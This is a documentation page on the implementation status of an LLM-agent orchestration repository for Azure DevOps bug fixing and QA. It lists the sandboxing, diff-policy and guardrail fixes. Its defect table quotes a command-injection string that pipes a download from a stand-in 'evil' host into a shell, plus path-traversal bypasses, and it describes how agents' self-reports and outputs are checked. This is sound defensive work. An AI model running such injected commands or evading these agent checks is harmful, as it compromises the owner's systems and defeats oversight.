# 15 — Implementation status (what actually runs)

The first version of this repository was a blueprint: docs, an orchestrator skeleton and pipeline templates. This page records what is now **implemented and tested**, what changed from the blueprint and why, and what still needs a live Azure environment to verify.

## Run it in two minutes (no Azure, no API key)

```bash
python -m venv .venv && . .venv/bin/activate
pip install pytest pyyaml requests openai anthropic azure-identity azure-functions
python -m pytest -q                 # ~100 tests, ~10 s
python scripts/demo_local.py        # triage -> dev -> failing trusted gate -> child bug -> iteration 2 -> sign-off
```

## Run it for real against a repository (your machine, a real model)

```bash
export LLM_PROVIDER=anthropic ANTHROPIC_API_KEY=...        # or LLM_PROVIDER=azure + FOUNDRY_ENDPOINT / *_DEPLOYMENT (az login)
python agents/local_loop.py --repo ../my-project --task "Bug: ... steps ... expected ... actual ..." --type bug
```

The target repository needs a `.agent/project.json` ([docs/16](16-project-adapters.md)). The agents work in a throw-away `git worktree` on branch `ai/<id>-<slug>`; your checkout is never touched; nothing is pushed unless you add `--push` (never to `main`). The run leaves `report.md`, `report.json` and the full transcripts under `<repo>/.agent-runs/<id>/`.

## What is implemented

| Area | Where | Tested by |
|---|---|---|
| Loop engine (events → decisions → side effects), no Azure imports | `orchestrator/engine.py`, `routing.py` | `orchestrator/tests/test_engine.py` (16 scenarios) |
| In-memory Azure DevOps for tests/simulation | `orchestrator/fake_ado.py`, `ports.py` | engine + local-loop tests |
| Provider-neutral LLM layer (Azure OpenAI, Anthropic/Claude, scripted) | `orchestrator/llm.py` | `test_llm_triage.py` (wire formats, tool calls, bad JSON) |
| Triage with fail-safe parsing | `orchestrator/triage.py` | `test_llm_triage.py` |
| Sandboxed agent tools (paths, protected files, command allow-list, no shell, secret scrubbing) | `agents/tools.py` | `agents/tests/test_tools.py` (60+ cases) |
| Agent runner with validated results | `agents/runner.py` | `agents/tests/test_runner.py` |
| Diff policy (protected paths, budget, skipped/deleted tests), shared by CI and local gate | `agents/policy.py`, `scripts/check_agent_diff.py` | `test_policy.py`, `tests/test_scripts.py` |
| Local end-to-end loop on a real git repo | `agents/local_loop.py` | `tests/test_local_loop.py`, `scripts/demo_local.py` |
| Pipelines (kit-as-resource, trusted gates, events) | `pipelines/*.yml` | `tests/test_pipelines.py` (structure, references) |
| Infrastructure | `infra/main.bicep` | `tests/test_infra.py` (compiles; every env var the code reads is an app setting) |

## Changes from the blueprint (and the defects they fix)

| # | Blueprint behaviour | Problem | Now |
|---|---|---|---|
| 1 | Command allow-list used `cmd.startswith(...)` and ran with `shell=True` | `npm test; curl evil \| sh` passed the check and ran | shlex parsing, **no shell**, metacharacters rejected, token-prefix match |
| 2 | Protected-path check compared the raw string | `./pipelines/ci.yml` and `a/../pipelines/ci.yml` bypassed it | paths are resolved first (also symlinks); glob patterns; defaults always apply |
| 3 | A QA `pass` could coexist with a severity 1–2 bug (prompt rule only) | the model decides | enforced in code (`validate_result`) |
| 4 | Child bugs raised by QA were never closed | a fixed bug could never reach sign-off (open child bug blocks it) | a passing QA run closes the `ai-raised` child bugs it verified; human-raised ones keep blocking |
| 5 | Dev agent's success was taken at its word | | pipeline and local loop re-run build + tests and the diff policy themselves; failures become bugs |
| 6 | Dev result and "QA started" never reached the orchestrator | `ai-owner:qa`, blocked → escalate, PR tags never happened | events `ai.dev.result`, `ai.qa.started` (`scripts/post_event.py`) |
| 7 | Guardrails documented (token budget, wall-clock, oscillation) but absent | | implemented in the engine with tags `ai-tokens:`, `ai-started:`, `ai-fail:`; a timer function sweeps stuck items |
| 8 | Duplicate webhook deliveries re-queued work | | engine ignores events for finished items (idempotent) |
| 9 | Triage JSON was trusted | a model reply could route anything | unknown routes/risk fail safe; high risk can never go straight to dev |
| 10 | Function App settings in Bicep incomplete | the Function could not start | all settings added; a test fails if code reads a setting Bicep lacks |
| 11 | Azure OpenAI only | | `LLM_PROVIDER=anthropic` (Claude) supported through the same tool interface |

## Not verified here (needs your tenant — do this before relying on it)

* A live Azure DevOps organisation: service hooks, `az boards`/`az repos` calls in the pipelines, branch-policy interplay, environment approvals.
* Real calls to Azure OpenAI / Anthropic: the provider adapters are tested against fake clients that mirror the SDK shapes, not against the services.
* Pipelines were validated structurally (YAML parses, references exist), not executed.
* Costs and model behaviour on large repositories (see [docs/08](08-costing.md), [docs/13](13-metrics-and-kpis.md) to measure).
